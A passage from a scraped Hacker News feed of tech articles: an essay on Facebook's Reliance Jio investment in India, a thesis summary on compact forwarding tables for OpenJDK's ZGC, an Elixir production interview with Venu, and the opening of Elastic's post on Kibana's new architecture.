data-lazy-srcset="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?w=1360&amp;ssl=1 1360w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=300%2C193&amp;ssl=1 300w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=1024%2C658&amp;ssl=1 1024w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=768%2C494&amp;ssl=1 768w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=1200%2C771&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?fit=1024%2C658&amp;ssl=1&amp;is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Internet Users in US vs. EU vs. India</figcaption></figure></div>



<div><p>That is not the first try from Facebook to enter the Indian market. They saw India as the future for growth since 2013. But their attempts failed in 2016 after regulation blockers over Free Internet Initiative and providing payment solution for WhatsApp.</p><p>This time they tried a different approach by partnering with Reliance Jio, the largest telecom provider in India, To avoid getting in conflict with the Indian government direction to empower the Indian companies.</p></div>



<p>This investment has three main strategic advantages:</p>



<h3>1- Facebook + Instagram vs. TikTok</h3>



<p>In recent years, TikTok, the app owned by the Chinese giant ByteDance has got a market share in India that all the US Tech companies – including Facebook – couldn’t acquire.</p>



<blockquote><p>In recent years, ByteDance’s TikTok has won users that all of these companies have struggled to reach. TikTok has amassed more than 250 million users in India (as of last year), and the company says it is on track to add another 100 million this year.</p><cite>TechCrunch</cite></blockquote>



<p>But not just in India. Tiktok already got a significant market share in many different countries as a social platform. And I think Facebook bearly started to take any action against the viral usage of Tiktok, especially between teenagers.</p>



<p>That’s the first reason which serves – still – into increasing Ads revenue stream. But in general, Facebook couldn’t monetize the increasing users’ usage in Asia compared to users in the US and Europe.</p>



<figure><img data-attachment-id="566" data-permalink="https://thezentech.co/2020/06/29/facebook-and-amazon-all-roads-lead-to-india/db3f9870-4517-4264-89ad-b67e459adf20/" data-orig-file="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?fit=1425%2C879&amp;ssl=1" data-orig-size="1425,879" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="DB3F9870-4517-4264-89AD-B67E459ADF20" data-image-description="" data-medium-file="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?fit=300%2C185&amp;ssl=1" data-large-file="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?fit=1024%2C632&amp;ssl=1" src="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?fit=1024%2C632&amp;ssl=1" alt="" width="768" height="474" srcset="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?w=1425&amp;ssl=1 1425w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=300%2C185&amp;ssl=1 300w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=1024%2C632&amp;ssl=1 1024w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=768%2C474&amp;ssl=1 768w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=1200%2C740&amp;ssl=1 1200w" sizes="(max-width: 768px) 100vw, 768px" data-lazy-srcset="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?w=1425&amp;ssl=1 1425w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=300%2C185&amp;ssl=1 300w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=1024%2C632&amp;ssl=1 1024w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=768%2C474&amp;ssl=1 768w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?resize=1200%2C740&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/DB3F9870-4517-4264-89AD-B67E459ADF20.jpeg?fit=1024%2C632&amp;ssl=1&amp;is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Facebook’s average revenue per user 2019 Q4</figcaption></figure>



<p>So that leads us to the second strategic advantage.</p>



<h3><strong><strong>2- E-commerce via WhatsApp and an opportunity for a SuperApp</strong></strong></h3>



<p>In one of the future essays, I want to dig deeper into the story of WeChat, the Chinese SuperApp. And this related to today’s essay since Facebook has an opportunity to transfer WhatsApp into a similar user experience in the Indian market. The same try that Careem – now owned by Uber – is seeking in the Middle East. See the market pattern?</p>



<p>Reliance Jio also wants to take on Amazon in e-commerce in India, but to take on Amazon, they can’t play like Amazon! As Brad Pitt stated in Moneyball in a different context about the Yankees.</p>



<div><figure><img data-attachment-id="551" data-permalink="https://thezentech.co/2020/06/29/facebook-and-amazon-all-roads-lead-to-india/img_0014/" data-orig-file="https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?fit=898%2C500&amp;ssl=1" data-orig-size="898,500" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_0014" data-image-description="" data-medium-file="https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?fit=300%2C167&amp;ssl=1" data-large-file="https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?fit=898%2C500&amp;ssl=1" src="https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?resize=674%2C375&amp;ssl=1" alt="" width="674" height="375" srcset="https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?w=898&amp;ssl=1 898w, https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?resize=300%2C167&amp;ssl=1 300w, https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?resize=768%2C428&amp;ssl=1 768w" sizes="(max-width: 674px) 100vw, 674px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?w=898&amp;ssl=1 898w, https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?resize=300%2C167&amp;ssl=1 300w, https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?resize=768%2C428&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0014.jpg?resize=674%2C375&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Moneyball</figcaption></figure></div>



<p>WhatsApp is already popular in India, but as I mentioned before, Facebook couldn’t pass the regulation to add payment service to WhatsApp to be able to monetize it. But after the partnership, Facebook could enter the e-commerce market in India much more comfortably. Either with more government-friendly WhatsApp solution or via JioMart service. As Mukesh Ambani (Reliance Jio’s largest shareholder) referred to in the deal announcement:</p>



<blockquote><p>Ambani added that JioMart and WhatsApp will enable 30 million neighborhood stores (kirana) to transact digitally “in the near future.” WhatsApp has been working with the Indian government for more than two years to expand its payments service in India — but the project remains stuck in regulatory hurdles.</p><cite>Mukesh Ambani</cite></blockquote>



<p>Facebook introduced WhatsApp for business a few months ago. And as they described, the main feature in WhatsApp blog is adding products catalog inside WhatsApp, so users don’t need to go to external websites. Then all from products exploring to payment process (later on) could be done entirely within WhatsApp experience.</p>



<blockquote><p>Catalogs are a mobile storefront for businesses to showcase and share their goods so people can easily browse and discover something they would like to buy. Previously businesses had to send product photos one at a time and repeatedly provide information — now customers can see their full catalog right within WhatsApp. This makes business owners look more professional and keeps customers engaged in the chat without having to visit a website.</p><cite>WhatsApp blog</cite></blockquote>



<p>Fun note, the feature demo in WhatsApp blog is for a local Indian store. Good one WhatsApp 😉</p>



<div><figure><img data-attachment-id="552" data-permalink="https://thezentech.co/2020/06/29/facebook-and-amazon-all-roads-lead-to-india/img_0017/" data-orig-file="https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?fit=1027%2C1109&amp;ssl=1" data-orig-size="1027,1109" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_0017" data-image-description="" data-medium-file="https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?fit=278%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?fit=948%2C1024&amp;ssl=1" src="https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=474%2C512&amp;ssl=1" alt="" width="474" height="512" srcset="https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=948%2C1024&amp;ssl=1 948w, https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=278%2C300&amp;ssl=1 278w, https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=768%2C829&amp;ssl=1 768w, https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?w=1027&amp;ssl=1 1027w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=948%2C1024&amp;ssl=1 948w, https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=278%2C300&amp;ssl=1 278w, https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=768%2C829&amp;ssl=1 768w, https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?w=1027&amp;ssl=1 1027w" data-lazy-src="https://i2.wp.com/thezentech.co/wp-content/uploads/2020/06/img_0017.jpg?resize=474%2C512&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>WhatsApp for business</figcaption></figure></div>



<h3><strong>3- Reliance Jio + Facebook vs. Amazon</strong></h3>



<blockquote><p>With only about half of India’s 1.3 billion people online so far, e-commerce sales are projected to more than double to $68.4 billion by 2022 from $26.9 billion in 2018</p><cite>Wall Street Journal</cite></blockquote>



<p>With the promising opportunity in India, someone else was watching. Who knows a lot about e-commerce, Jeff Bezos.</p>



<p>Jeff Bezos visited India recently to announce an extra $1 Billion investment – after the initial investment $5 Billion -, and told a gathering of local Amazon sellers:</p>



<blockquote><p>The intent is to help more small businesses start selling on the company’s marketplace. The new funds will supplement the $5 billion that Amazon has said it is spending to build out its Indian business […] We’re making this announcement now because it’s working,” Mr. Bezos said referring to Amazon’s efforts to get India’s legions of mom-and-pop shops connected to its platform. “And when something works, you should double down on it.”</p><cite>Wall Street Journal</cite></blockquote>



<p>It’s interesting to see and learn from what’s happening in India in the near future since similar competition fields happen in other places like in Africa or the Arabic world while big tech companies are looking to the east for strategic opportunities.</p>



<p>=======</p>



<h3>Resources</h3>



<ul><li><a href="https://stratechery.com/2020/facebook-earnings-auction-dynamics-full-steam-ahead/">Facebook Earnings, Auction Dynamics, Full Steam Ahead</a></li></ul>



<ul><li><a href="https://www.wsj.com/articles/mark-zuckerberg-promotes-facebook-growth-in-india-1445959248">Mark Zuckerberg Promotes Facebook Growth in India</a></li></ul>



<ul><li><a href="https://techcrunch.com/2020/04/21/facebook-reliance-jio/">Facebook invests $5.7B in India’s Reliance Jio Platforms</a></li></ul>



<ul><li><a href="https://www.wsj.com/articles/amazons-bezos-pledges-new-1-billion-india-investment-amid-pushback-11579089836?mod=e2fb">Amazon’s Bezos Pledges New $1 Billion India Investment Amid Pushback</a></li></ul>



<ul><li><a href="https://www.nytimes.com/2020/04/21/technology/facebook-jio-india.html">Facebook Invests $5.7 Billion in Indian Internet Giant Jio</a></li></ul>



<ul><li><a href="https://www.wsj.com/articles/inside-facebook-and-private-equitys-8-8-billion-bet-on-indias-richest-man-11589972400?mod=pls_whats_news_us_business_f">Inside Facebook and Private Equity’s $8.8 Billion Bet on India’s Richest Man</a></li></ul>



<ul><li><a href="https://www.forbes.com/sites/michelleevans1/2019/03/11/careem-shares-plans-to-become-super-app-of-the-middle-east/#3ef41bf15d02">Careem Shares Plans To Become The Super App Of The Middle East</a></li></ul>



<ul><li><a href="https://blog.whatsapp.com/introducing-catalogs-for-small-businesses">Introducing Catalogs for Small Businesses</a></li></ul>




        	<!-- .entry-meta -->
	<!-- end entry-meta --> 
  </div></div>]]>
            </description>
            <link>https://thezentech.co/2020/06/29/facebook-and-amazon-all-roads-lead-to-india/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700566</guid>
            <pubDate>Wed, 01 Jul 2020 12:20:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compact forwarding information for the Z Garbage Collector in the OpenJDK]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23700451">thread link</a>) | @pjmlp
<br/>
July 1, 2020 | https://inside.java/2020/06/25/compact-forwarding/ | <a href="https://web.archive.org/web/*/https://inside.java/2020/06/25/compact-forwarding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry"><hr>

<p><em>The work presented here is performed as part of the <a href="https://inside.java/2020/06/12/joint-research-projects/">joint research project between Oracle, Uppsala University and KTH</a>. Follow the blog series here at inside.java to read more about the JVM research performed at the Oracle Development office in Stockholm.</em></p>

<hr>

<p>This is a short description about my work on garbage collection that I did for my master thesis. This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<h2 id="references">References</h2>

<p>[1] Lidén P. <a href="https://mail.openjdk.java.net/pipermail/announce/2017-October/000237.html">CFV: New Project: ZGC; 2017</a>.</p>

<p>[2] Lidén P, Karlsson S. <a href="http://openjdk.java.net/jeps/333">JEP 333: ZGC: A Scalable Low-Latency Garbage Collector</a>.</p>
</div></div>]]>
            </description>
            <link>https://inside.java/2020/06/25/compact-forwarding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700451</guid>
            <pubDate>Wed, 01 Jul 2020 11:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elixir in Production: Venu]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23700426">thread link</a>) | @NaeosPsy
<br/>
July 1, 2020 | https://serokell.io/blog/elixir-in-production-venu | <a href="https://web.archive.org/web/*/https://serokell.io/blog/elixir-in-production-venu">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this article, we’re interviewing Nathan Johnson, one of the co-founders of <a href="https://beta.venu.tv/">Venu</a>, a community-driven online marketplace for virtual events. Venu is written in Elixir and has recently gone into beta, so we thought it would be an excellent opportunity to learn more about the choice and advantages of using Elixir for one’s startup. If you want to learn about their stack and how Phoenix LiveView enabled them to build their app quickly (3 months of part-time work), read on.</p><h3 id="interview-with-nathan-johnson">Interview with Nathan Johnson</h3><h4 id="could-you-tell-us-more-about-your-company-and-your-role-there%3F">Could you tell us more about your company and your role there?</h4><p>Sure thing. Venu is a marketplace for live events/experiences. It allows organizers to create/sell tickets, set up schedules and multi-track events, and live stream those events in the same vein as Twitch or Mixer. Its focus is on conferences but can be used for any live-streamed content.</p><p>I am one of the co-founders along with Brodey Newman and Dillon Chanis. I do a good bit of the backend development/integrations.</p><p><img src="https://serokell.io/files/67/675pkgmd.team2.jpg" alt="Venu team"></p><hr><center><i>
	The co-founders of Venu.</i></center><h4 id="could-you-talk-about-the-stack-of-venu%3F-any-particular-elixir-libraries-that-you-want-to-feature%3F">Could you talk about the stack of Venu? Any particular Elixir libraries that you want to feature?</h4><p>Our stack is Elixir + Phoenix LiveView + Alpine.js + Tailwind CSS hosted on Gigalixir with a couple of AWS services (S3/CloudFront).</p><p>LiveView has enabled us to build the app in about three months part-time and is definitely worth mentioning. It can be a bit of a learning curve, and new things are always being added to it, but the velocity it gives you is well worth it. You don’t have to worry about the plumbing of how data gets from your backend to the frontend so you can focus primarily on the UI/presentation layer. LiveView isn’t a 1.0 release yet, so there have been some challenges with new releases coming out and some bugs, but overall it’s been fantastic.</p><h4 id="do-you-use-any-erlang-libraries-in-elixir-code%3F-if-so%2C-are-there-any-you-would-like-to-feature%3F">Do you use any Erlang libraries in Elixir code? If so, are there any you would like to feature?</h4><p>Nothing third-party, but some of our prototype streaming code is using the raw <code>:ssl</code> and <code>:gen_tcp</code> libraries.</p><h4 id="do-you-use-distributed-erlang-functionality-for-cross-node-message-passing%3F-why-or-why-not%3F">Do you use distributed Erlang functionality for cross-node message passing? Why or why not?</h4><p>Currently, we don’t use cross-node messaging because we can run everything off a single replica, but we built our app with that in mind. For instance, our code that manages the state of a live stream, users connected, etc. is all GenServers, so if we need to scale out, we can transition from a single node to multiple nodes with message passing easily.</p><h4 id="do-you-have-non-beam-code-in-your-codebase%3F-if-so%2C-how-much-and-why%3F">Do you have non-BEAM code in your codebase? If so, how much and why?</h4><p>Only some of our front end is non-BEAM because we didn’t want to put things like which modals/dropdowns were open in our LiveView state. We’ve considered writing some Rust for the live streaming as well, but Elixir works pretty well for that.</p><h4 id="where-is-elixir-great-to-use-and-where-does-it-fall-short-in-your-stack%3F">Where is Elixir great to use and where does it fall short in your stack?</h4><p>Elixir has been great for everything so far. A lot of our codebase right now is a simple Phoenix app managing some basic content, but even the complex stuff like payouts via Stripe and the live streaming has been trivial as well. The only thing we had any real issues with was deployment, but we’ve been using Gigalixir and it makes that process extremely simple.</p><h4 id="what-was-the-biggest-challenge-you%E2%80%99ve-overcome-while-working-on-this-project%3F-if-elixir-helped-you-to-solve-it%2C-how%3F">What was the biggest challenge you’ve overcome while working on this project? If Elixir helped you to solve it, how?</h4><p>We had a couple of major challenges. The first one: an ongoing issue with time zones that is not that fun to talk about but is easily solved with Elixir’s Timex library. The other one was handling real-time content, which is pretty interesting.</p><p>For our app, we need to keep everyone in sync when viewing/messaging on a live stream. Elixir definitely helped solve this in a simple way. Phoenix has built-in Pub/Sub functionality that allows us to broadcast and subscribe from our LiveView instances. So, we can easily publish updates for when a stream starts/stops or when new messages come in, and the UI updates in real-time because of the magic of LiveView.</p><p><img src="https://serokell.io/files/60/60wm93ma.venu_meta.png" alt="60wm93ma.venu_meta.png"></p><hr><center><i>You can try out Venu by <a href="https://beta.venu.tv/">signing up</a> for its closed beta. </i></center><h4 id="are-you-satisfied-with-the-result%3F">Are you satisfied with the result?</h4><p>Absolutely. It has definitely come a long way over the past three months, and I look forward to what’s to come.</p><h4 id="what-is-your-scaling-strategy-post-launch%3F">What is your scaling strategy post-launch?</h4><p>After we’ve ironed out the bugs from our beta, we’ll be primarily focused on marketing and landing larger and larger conferences. Our app leverages some heavy third-party integrations to do the payments/streaming, so we should be able to scale well with what we have in place.</p><h4 id="any-key-takeaways%3F">Any key takeaways?</h4><p>I would encourage anyone who hasn’t had the opportunity to check out Phoenix LiveView to take a minute to do so. It changes the way you think about building applications and, even though it is still pre 1.0,  is definitely worth investing in. It’s also a good way to get introduced to the joy of Elixir programming.</p><hr><p>We want to thank Nathan for taking his time to talk with us, and wish the best of luck to Venu and its team!</p><p>If you want to read more about companies using functional programming in production, we suggest you check out our <a href="https://serokell.io/blog/haskell-in-production">Haskell in Production</a> articles or our overview of <a href="https://serokell.io/blog/elixir-companies">the largest Elixir-using companies</a>.</p><p>If you have your own Elixir in production story to tell (both good and bad), we definitely want to hear it! You are welcome to write to us: <a href="mailto:hi@serokell.io">hi@serokell.io</a>.</p></div></div>]]>
            </description>
            <link>https://serokell.io/blog/elixir-in-production-venu</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700426</guid>
            <pubDate>Wed, 01 Jul 2020 11:54:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Architecture for Kibana]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23700214">thread link</a>) | @soheilpro
<br/>
July 1, 2020 | https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We’re excited to share more details today about a long-running project that the Kibana team has been working on for the past couple of years: the Kibana development platform.&nbsp;
</p><p>If you’re a Kibana plugin developer or enjoy lurking around our GitHub repo, you’ve probably seen mentions of “the new platform.” This is a re-architecture project we’re close to completing that enables the future of Kibana plugin development for both developers at Elastic and the wider Kibana community. So why did we build this? Let’s start with a bit of history.
</p> <p><strong><h2>Kibana 4.0, a modest JavaScript app</h2></strong></p><p>The first “architecture” of Kibana was put together all the way back in 2015, <a href="https://www.elastic.co/blog/kibana-4-literally/">starting with Kibana 4.0</a>. At the time, we had just three apps: Discover, Visualize, and Dashboard. Even more critically, we only had four full-time developers.
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf50f9b7f4bece58d/5ef67b9ca917b92b287f6677/blog-new-kibana-arch-4-0.jpg" data-sys-asset-uid="bltf50f9b7f4bece58d" alt="Kibana 4.0: Not too shabby for only having four full-time developers"></p><p>With such a small team, we reached for familiar libraries and built Kibana around them: Angular.js, Express, and RequireJS. We added Hapi.js and used Hapi’s plugin system to build server-side plugins. On the front end, each application was a separate Angular.js app built on some shared code. Using familiar tools allowed us to iterate quickly, avoid reinventing the wheel, and ship features at a whiplash pace. It worked well!
</p><p>Fast forward a few years and Kibana comprised a whopping 97 plugins and was actively worked on by over 100 Elastic developers. Kibana had become one of the largest open source JavaScript apps in the world. The simple architecture we had built was starting to bow under this weight. Writing cross-application integrations was difficult, unintended breakages were common, development performance was poor, and ramping up new developers on Kibana was difficult.
</p><p>Our patchwork system of solutions had finally taken us as far as it could and it was clear we needed to think again from first principles. A group of Kibana engineers set out to design a new system that could scale with Kibana, our team, and the community: the Kibana development platform.
